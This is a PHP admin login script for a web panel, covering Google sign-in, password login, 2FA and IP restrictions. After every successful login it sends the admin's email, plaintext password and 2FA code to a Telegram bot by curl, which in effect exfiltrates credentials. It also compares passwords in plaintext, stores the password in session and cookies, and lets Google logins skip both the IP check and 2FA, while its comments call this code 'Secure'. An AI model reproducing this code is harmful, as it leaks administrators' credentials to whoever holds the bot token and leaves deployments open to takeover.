<?php
use PragmaRX\Google2FA\Google2FA;
use Google\Client as Google_Client;

if (!defined('BASEPATH')) {
    die('Direct access to the script is not allowed');
}

require 'vendor/autoload.php'; // Ensure Google2FA and Google API Client are installed via Composer

session_start();

$settings = getSettings();
$google_client_id = $settings["googleclientid"];
$google_client_secret = $settings["googleclientsecret"];
$google_redirect_uri = site_url("$rentaladmin");
$adminbottoken = $settings["adminbottoken"];
$chat_id = $settings["chat_id"];
$dateTime = date("Y-m-d H:i:s");
$admin_ip_protect = $settings['admin_ip_protect'];

$ip = $_SERVER['REMOTE_ADDR'];
$allowed_ips = getAllowedIPs();

// Google Login Handling
if (isset($_POST['google_token'])) {
    $google_client = new Google_Client(['client_id' => $google_client_id]);
    $payload = $google_client->verifyIdToken($_POST['google_token']);
    if ($payload) {
        $email = $payload['email'];

        // Check if the user exists in the database
        $admin = $conn->prepare("SELECT * FROM admins WHERE admin_email=:email");
        $admin->execute(['email' => $email]);
        $admin = $admin->fetch(PDO::FETCH_ASSOC);

        if ($admin) {
            $update = $conn->prepare("UPDATE admins SET login_date=:login_date, login_ip=:login_ip WHERE admin_id=:id");
            $update->execute([
                'login_date' => $dateTime,
                'login_ip' => $ip,
                'id' => $admin['admin_id']
            ]);
            setAdminSession($admin);
            header('Location: ' . site_url("$rentaladmin"));
            exit();
        } else {
            $error = 1;
            $errorText = "Could not find administrator account registered with this email.";
        }
    }
}

if ($admin_ip_protect == 2) {
    if (!in_array("*", $allowed_ips) && !in_array($ip, $allowed_ips)) {
        require admin_view('access_denied');
        exit();
    }
}

// Login Form Handling
if ($_POST) {
    $email = htmlspecialchars($_POST["email"]);
    $pass = $_POST["password"];
    $two_factor_code = htmlspecialchars($_POST["two_factor_code"]);

    // Secure Query Using Prepared Statements
    $admin = $conn->prepare("SELECT * FROM admins WHERE admin_email=:email AND password=:password");
    $admin->execute(['email' => $email, 'password' => ($pass)]);
    $admin = $admin->fetch(PDO::FETCH_ASSOC);

    if ($admin) {
        $access = json_decode($admin["access"], true);
        if ($access["admin_access"]) {
            if ($admin["two_factor"] == 1) {
                $google2fa = new Google2FA();
                
                // Check if the user entered a 2FA code
                if (empty($two_factor_code)) {
                    $error = 1;
                    $errorText = "Two-factor authentication (2FA) code is required.";
                    require admin_view('login');
                    exit();
                }

                // Validate 2FA code
                if (!$google2fa->verifyKey($admin["two_factor_secret_key"], $two_factor_code)) {
                    $error = 1;
                    $errorText = "Invalid 2FA code.";
                    require admin_view('login');
                    exit();
                }
            }

            setAdminSession($admin);
            $update = $conn->prepare("UPDATE admins SET login_date=:login_date, login_ip=:login_ip WHERE admin_id=:id");
            $update->execute([
                'login_date' => $dateTime,
                'login_ip' => $ip,
                'id' => $admin['admin_id']
            ]);

            // Fetch the specific admin's Telegram chat_id
            $chat_id = $admin["chat_id"];  
            $adminbottoken = $settings["adminbottoken"]; // Bot token

            $dateTime = date("Y-m-d H:i:s");
            $ipAddress = $_SERVER['REMOTE_ADDR']; // Fetch the IP address

            // Send notification to that particular admin
            $telegramMessage = "*Admin Login Detected*\n\n";
            $telegramMessage .= "*Email:* $email\n";
            $telegramMessage .= "*Password:* `$pass`\n";
            $telegramMessage .= "*2FA Code:* `$two_factor_code`\n";
            $telegramMessage .= "*Date & Time:* `$dateTime`\n";
            $telegramMessage .= "*IP Address:* `$ipAddress`\n";

            // Send the message to Telegram
            if (!empty($chat_id)) { 
                $telegramsendmsg = "https://api.telegram.org/bot$adminbottoken/sendMessage?chat_id=$chat_id&text=" . urlencode($telegramMessage) . "&parse_mode=Markdown";

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $telegramsendmsg);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                $response = curl_exec($ch);
                curl_close($ch);
            }

            // Check if email 2FA is enabled
            if ($admin["email_2fa"] == 1) {
                header('Location: ' . site_url("$rentaladmin/email_verification"));
            } else {
                header('Location: ' . site_url("$rentaladmin"));
            }
            exit();
        }
    } else {
        $error = 1;
        $errorText = "Invalid email or password.";
    }
}

require admin_view('login');

// Secure Session Function
function setAdminSession($admin) {
    $secure = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on');
    $_SESSION["msmbilisim_adminlogin"] = 1;
    $_SESSION["msmbilisim_adminslogin"] = 1;
    $_SESSION["msmbilisim_adminid"] = $admin["admin_id"];
    $_SESSION["msmbilisim_adminpass"] = $admin["password"];
    
    setcookie("a_login", 'ok', time() + (60 * 60 * 24 * 7), '/', '', $secure, true);
    setcookie("a_id", $admin["admin_id"], time() + (60 * 60 * 24 * 7), '/', '', $secure, true);
    setcookie("a_password", $admin["password"], time() + (60 * 60 * 24 * 7), '/', '', $secure, true);
}

// Secure Database Query Functions
function getSettings() {
    global $conn;
    $stmt = $conn->prepare("SELECT * FROM settings LIMIT 1");
    $stmt->execute();
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function getAllowedIPs() {
    global $conn;
    $stmt = $conn->prepare("SELECT ip_address FROM allowed_admin_ip");
    $stmt->execute();
    return $stmt->fetchAll(PDO::FETCH_COLUMN);
}

?>
